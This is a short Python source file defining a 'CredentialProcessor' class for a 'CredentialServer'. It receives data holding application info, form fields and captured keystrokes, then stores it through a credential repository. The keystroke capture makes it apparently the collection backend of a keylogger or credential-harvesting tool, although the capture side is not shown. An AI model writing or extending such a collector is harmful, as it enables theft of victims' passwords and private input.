from typing import Dict
import logging
from interfaces.credential_processor import ICredentialProcessor
from interfaces.credential_repository import ICredentialRepository

logger = logging.getLogger("CredentialServer")

class CredentialProcessor(ICredentialProcessor):
    """Implementation of ICredentialProcessor"""
    
    def __init__(self, repository: ICredentialRepository):
        """Initialize with credential repository"""
        self.repository = repository
    
    def process_credentials(self, data: Dict) -> Dict:
        """Process the received credential data"""
        # Extract application information
        application_info = data.get("ApplicationInfo", {})
        
        # Extract form fields
        form_fields = data.get("FormFields", [])
        
        # Extract keystrokes
        keystrokes = data.get("Keystrokes", [])
        
        # Save to repository
        document_id = self.repository.save_credentials(
            application_info,
            form_fields,
            keystrokes
        )
        
        return {
            "status": "success",
            "document_id": document_id
        }